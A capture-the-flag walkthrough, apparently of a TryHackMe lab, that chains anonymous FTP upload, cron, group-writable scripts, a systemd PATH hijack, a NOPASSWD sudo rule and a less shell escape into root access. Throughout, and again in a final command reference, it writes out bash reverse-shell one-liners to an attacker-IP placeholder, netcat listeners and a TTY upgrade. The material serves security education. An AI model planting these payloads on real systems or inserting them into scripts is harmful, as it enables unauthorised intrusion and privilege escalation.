# Recon Pipeline — Full Walkthrough (Anonymous FTP → Root)

## TL;DR

An anonymous FTP server hosts an automated "recon pipeline" that blindly executes any script dropped into its watch folder. By abusing weak trust boundaries at every stage — group memberships, writable files owned by lower-privileged users but executed by higher-privileged automation, and an overly permissive sudo rule — we escalate:

```
Anonymous FTP → recon_user → dev_user → monitor_user → ops_user → root
```

**Core lesson:** almost every hop in this chain is the *same* vulnerability pattern repeated: *"A higher-privileged process executes a file that a lower-privileged user can write to."* Once you learn to spot that pattern once, you can spot it five times.

---

## Stage 0 — Recon

### Port scan
```bash
nmap -sC -sV -p- -T4 10.49.144.194
```
**Result:**
```
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
```
Only two services exposed. No web server — so FTP is the only real attack surface to start with.

### Anonymous FTP login
```bash
ftp 10.49.144.194
Name: Anonymous
Password: (blank or "anonymous")
```
vsftpd allowed anonymous login — always worth trying on any FTP service you find.

### Enumerating the FTP tree
```
ftp> ls
drwxrwxrwx   incoming
drwxr-xr-x   pub

ftp> cd pub
ftp> ls
-rw-r--r--   README.txt
drwxr-xr-x   archive
drwxrwxrwx   uploads
```

**Key lesson:** `ls -la` and paying attention to permission bits (`rwxrwxrwx` = world-writable) is critical. World-writable directories are near-guaranteed to be part of the intended attack path in a CTF.

### Reading the hint file
```bash
get README.txt
cat README.txt
```
```
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

This tells us: something on the server watches `incoming/` and executes files placed there.

---

## Stage 1 — Anonymous FTP → `recon_user` (Remote Code Execution)

### Testing for execution
We didn't know the exact mechanism yet, so we tested empirically:
1. Uploaded a plain `.txt` file — no observable effect.
2. Uploaded a real nmap XML scan (`-oX`) — no observable effect.
3. **Uploaded a `.sh` script — it executed.**

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > shell.sh
```
```
ftp> cd incoming
ftp> put shell.sh
```
Listener:
```bash
nc -lvnp 4444
```
**Result:** reverse shell as `recon_user`.

### Why this worked
Once inside, we found the actual automation:
```bash
crontab -l
# * * * * * /bin/bash /opt/recon/scan_uploads.sh

cat /opt/recon/scan_uploads.sh
```
```bash
#!/bin/bash
shopt -s nullglob
for f in /srv/ftp/incoming/*.sh; do
  /bin/bash "$f" &
  sleep 5
done
```

**Root cause:** a cron job, running every minute as `recon_user`, blindly executes any `.sh` file found in the world-writable FTP `incoming/` directory — no validation of content or origin.

**Flag found:**
```bash
cat ~/flag.txt
```

---

## Stage 2 — `recon_user` → `dev_user` (Group Membership Abuse)

### Enumeration
```bash
id
# uid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```
`recon_user` is unexpectedly also a member of the `dev_user` and `devops` groups — this is the trust-boundary flaw for this stage.

```bash
find / -group dev_user 2>/dev/null
```
Found:
```
/opt/dev/backup.sh   (owned by dev_user:dev_user, mode -rwxrwxr-x)
/opt/dev/bin/ps       (owned by dev_user:dev_user, mode -rw-rw-r--)
```

Because `recon_user` is in the `dev_user` group, and both files are **group-writable**, we can edit them directly.

### Checking the automation
```bash
cat /opt/dev/backup.sh
```
```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

At this point we only *suspected* this script runs automatically and as `dev_user` — the file being group-writable and owned by `dev_user` is circumstantial evidence, not proof. `crontab -l` as `recon_user` only shows `recon_user`'s own jobs, and `/etc/cron.d/` had no entry for it, so the mechanism wasn't directly visible from configuration files.

### Confirming *who* actually executes it — don't assume, observe

Rather than guessing, we watched the live process table for the file to fire on its own:
```bash
watch -n 5 'ps aux | grep -i backup'
```
After a few minutes, without us running anything manually, this appeared:
```
dev_user    4673  ...  /bin/sh -c /bin/bash /opt/dev/backup.sh
dev_user    4675  ...  /bin/bash /opt/dev/backup.sh
```
**The `USER` column reading `dev_user`, on a freshly-spawned PID we never triggered ourselves, is the actual proof.** This confirms two separate things at once:
1. Something executes `backup.sh` on its own, periodically (process appeared without manual action)
2. It executes specifically **as `dev_user`**, not as `recon_user` (even though `recon_user` has group-execute rights and *could* run the file manually — that would show up as `recon_user` in `ps aux` instead)

This is an important distinction: group-execute permission means *we* could also run this file ourselves, but doing so would run it as our own user. The proof that it's `dev_user`'s own automation (not us accidentally triggering it) comes specifically from seeing `dev_user` in the process owner column on a PID we didn't spawn.

### Exploit
```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1' >> /opt/dev/backup.sh
```
Listener:
```bash
nc -lvnp 4445
```
Wait for the automation to fire again → shell as `dev_user`.

**Lesson:** group membership is a permission boundary just as important as file ownership. Always run `id` after landing on any user — inherited group access is one of the most common lateral movement vectors. But group-write/execute access to a file doesn't by itself prove the file is executed by someone else's automation — that has to be confirmed separately, either by locating the actual cron/timer definition, or by observing the process table (`ps aux`, watching the `USER` column) at the moment it fires on its own.

---

## Stage 3 — `dev_user` → `monitor_user` (PATH Hijack via systemd Service)

### Enumeration
```bash
find / -group monitor_user 2>/dev/null
```
Found:
```
/usr/local/bin/healthcheck   (owned by monitor_user)
```

```bash
systemctl cat healthcheck.service
```
```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

**Critical detail:** the service's `$PATH` puts `/opt/dev/bin` — a directory owned by `dev_user`, which we already control — **before** `/usr/bin` (where the real system binaries live).

```bash
cat /usr/local/bin/healthcheck
```
```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```
The script calls `ps aux` **without an absolute path**. Since `/opt/dev/bin` is searched first, and we control that directory (from Stage 2, we own `/opt/dev/bin/ps`), we can replace `ps` with our own binary — a classic **PATH hijack**.

### Exploit
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<ATTACKER_IP>/4447 0>&1' > /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```
Listener:
```bash
nc -lvnp 4447
```
The `healthcheck` loop calls `ps aux` every 5 seconds — connection lands almost immediately.

**Flag found:**
```bash
cat /home/monitor_user/flag.txt
```

**Lesson:** never trust `$PATH` order blindly. Any service or script that puts a non-standard, writable directory ahead of system paths (`/usr/bin`, `/bin`) is vulnerable to command hijacking if it calls any command without an absolute path.

---

## Stage 4 — `monitor_user` → `ops_user` (Writable File + Sudo Rule)

### Enumeration
```bash
find / -group ops_user 2>/dev/null
```
Found:
```
/opt/app/deploy_helper.sh   (owned by monitor_user!)
/usr/local/bin/deploy.sh    (owned by ops_user, not writable by us)
```
```bash
cat /usr/local/bin/deploy.sh
```
```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```
`deploy.sh` is owned by `ops_user` and executes `deploy_helper.sh` — which is a **separate file that we (monitor_user) own outright**.

**Key concept clarified during this stage:** file *ownership* only controls who can *edit* a file — it does not determine what user context the file *runs in*. A script runs as whoever's process invokes it. Since `deploy.sh` is executed as `ops_user`, anything it calls (including our writable `deploy_helper.sh`) also runs as `ops_user`, regardless of who owns that child script.

### The trigger — sudo rule (not cron this time)
```bash
sudo -l
```
```
User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```
This means we can directly invoke `deploy.sh` as `ops_user` any time, with no password.

### Exploit
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<ATTACKER_IP>/5556 0>&1' > /opt/app/deploy_helper.sh
chmod +x /opt/app/deploy_helper.sh
```
Listener:
```bash
nc -lvnp 5556
```
Trigger immediately (no waiting needed, since it's sudo-invoked, not cron-scheduled):
```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```
**Result:** shell as `ops_user`.

**Lesson:** always run `sudo -l` on every user you land on. A `NOPASSWD` rule that lets you execute a script owned by a different, more-privileged user is one of the most direct escalation vectors possible — no need to wait for cron timing at all.

---

## Stage 5 — `ops_user` → `root` (GTFOBins: `less`)

### Enumeration
```bash
sudo -l
```
```
(root) NOPASSWD: /usr/bin/less
```

### Why `less` gives root
`less` (like many pagers, editors, and text tools) supports shelling out to a command line via `!<command>` while the file is open in interactive mode. Since it's invoked via `sudo`, the shell it spawns inherits **root** privileges, not the invoking user's.

This is documented behavior across many binaries — see [GTFOBins](https://gtfobins.github.io/) for the full catalog of privileged binaries with known escapes (`less`, `vim`, `man`, `awk`, `find`, `nmap`, and dozens more).

### Exploit
```bash
sudo /usr/bin/less /etc/passwd
```
Once `less` is open and showing the file **interactively** (not immediately returned to a normal shell prompt — this matters, see pitfall below), type:
```
!/bin/bash
```
and press Enter. This spawns a root shell from within `less`.

Confirm:
```bash
whoami
id
```
Read the final flag:
```bash
cat /root/root.txt
```

### Pitfall we hit: non-interactive TTY
A raw `bash -i >& /dev/tcp/...` reverse shell isn't a fully interactive TTY. `less` detects this and just dumps the file to screen instead of opening its interactive pager — so `!/bin/bash` typed *after* it already exited gets interpreted by the parent shell instead (and fails, since `!/bin/bash` isn't valid bash syntax).

**Fix — upgrade the shell to a real TTY first:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then on the attacker (listener) side:
```
Ctrl+Z
stty raw -echo; fg
<press Enter twice>
export TERM=xterm
```
Then retry `sudo /usr/bin/less /etc/passwd` — it will now open properly in interactive mode, and `!/bin/bash` will work as expected.

---

## Full Command Reference (in order)

```bash
# Recon
nmap -sC -sV -p- -T4 10.49.144.194

# FTP anonymous access
ftp 10.49.144.194
Name: Anonymous
ls -la
cd pub && get README.txt
cat README.txt

# Stage 1: RCE via incoming/ (recon_user)
echo '#!/bin/bash
bash -i >& /dev/tcp/<IP>/4444 0>&1' > shell.sh
# ftp: cd incoming && put shell.sh
nc -lvnp 4444
crontab -l
cat /opt/recon/scan_uploads.sh
cat ~/flag.txt

# Stage 2: recon_user -> dev_user (group membership)
id
find / -group dev_user 2>/dev/null
cat /opt/dev/backup.sh
echo 'bash -i >& /dev/tcp/<IP>/4445 0>&1' >> /opt/dev/backup.sh
nc -lvnp 4445

# Stage 3: dev_user -> monitor_user (PATH hijack)
find / -group monitor_user 2>/dev/null
systemctl cat healthcheck.service
cat /usr/local/bin/healthcheck
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/4447 0>&1' > /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
nc -lvnp 4447
cat /home/monitor_user/flag.txt

# Stage 4: monitor_user -> ops_user (writable file + sudo)
find / -group ops_user 2>/dev/null
cat /usr/local/bin/deploy.sh
sudo -l
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/5556 0>&1' > /opt/app/deploy_helper.sh
chmod +x /opt/app/deploy_helper.sh
nc -lvnp 5556
sudo -u ops_user /usr/local/bin/deploy.sh

# Stage 5: ops_user -> root (GTFOBins less)
sudo -l
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, stty raw -echo; fg, export TERM=xterm
sudo /usr/bin/less /etc/passwd
!/bin/bash
whoami
cat /root/root.txt
```

---

## Key Takeaways / What I Learned

1. **Privilege escalation via cron is a repeating pattern, not a one-off trick.** Any time a cron job (or systemd timer/service) runs as a privileged user and executes a file, the real question to ask is: *"Can I, as a lower-privileged user, write to that file — or to anything in the directory it searches for commands?"* If yes, you can hijack it.

2. **File ownership ≠ execution context.** A script runs with the privileges of whoever's process invokes it, not whoever wrote or owns the file. This is the single most important mental model in this whole chain — it's why editing a file owned by `monitor_user` could still net a shell as `ops_user`.

3. **Group membership is an overlooked privilege boundary.** `id` should be one of the first commands run on every new shell. Unexpected group memberships (like `recon_user` being in `dev_user`'s group) are a direct sign of an intended lateral movement path.

4. **`$PATH` order matters enormously for services running as other users.** If a systemd service or script's `$PATH` includes a directory you can write to *before* the real system directories, and it calls any command without an absolute path, that's an instant hijack opportunity.

5. **Always run `sudo -l` on every user you land on.** It's the fastest way to find a direct, on-demand escalation path (versus waiting on cron timing), and a `NOPASSWD` entry for a script you can also write to (directly or indirectly) is close to an instant root/next-user shell.

6. **GTFOBins is essential once you have any sudo rule.** Even a rule that looks "safe" (like running `less`, `vim`, `man`, `find`, or `awk` as another user) can usually be turned into a full shell as that user, because so many common Unix tools have a documented "escape to shell" feature (`!command` in `less`, `:!command` in `vim`, etc.).

7. **A reverse shell from `bash -i >&/dev/tcp/...` is not a full TTY.** Interactive programs like `less`, `vim`, or `sudo -i` may misbehave until you upgrade it with `python3 -c 'import pty; pty.spawn("/bin/bash")'` plus the `stty raw -echo` trick on the attacker side.

8. **Empirical testing beats guessing when you can't read the source.** We didn't know upfront that `.sh` files were what got executed — we found out by testing multiple formats and observing which one produced side effects. When you can't see the backend, structured trial-and-error (with a listener open to catch feedback) is a legitimate and necessary technique.

9. **File ownership, group permissions, and "it eventually worked" are all circumstantial evidence — not proof of *who* executes a file.** The only direct proof that a file is executed by another user's automation (rather than by yourself, via inherited group-execute rights) is watching the live process table at the moment it fires:
   ```bash
   watch -n 5 'ps aux | grep -i <script_name>'
   ```
   The `USER` column on a freshly-spawned PID you didn't trigger yourself tells you definitively which identity is running it. This is more reliable than `crontab -l` (which only shows your *own* jobs unless you have elevated access) and works even when the scheduling mechanism (cron, systemd timer, or something else) isn't visible to you.